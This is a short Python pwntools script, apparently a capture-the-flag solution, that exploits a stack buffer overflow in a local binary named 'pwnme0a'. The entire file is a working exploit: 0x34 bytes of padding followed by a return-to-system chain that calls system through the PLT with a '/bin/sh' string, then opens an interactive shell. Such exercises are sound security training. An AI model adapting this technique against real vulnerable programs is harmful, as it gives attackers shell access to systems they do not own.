from pwn import *

context.arch = "i386"
elf = ELF("./pwnme0a")
b = process("./pwnme0a")

b.recvuntil(b"The Gateless Gate\n")
system_addr = elf.plt['system']
binsh_str = next(elf.search(b'/bin/sh'))

padding = b'A' * 0x34
payload = padding + p32(system_addr) + p32(0) + p32(binsh_str)
b.sendline(payload)
b.interactive()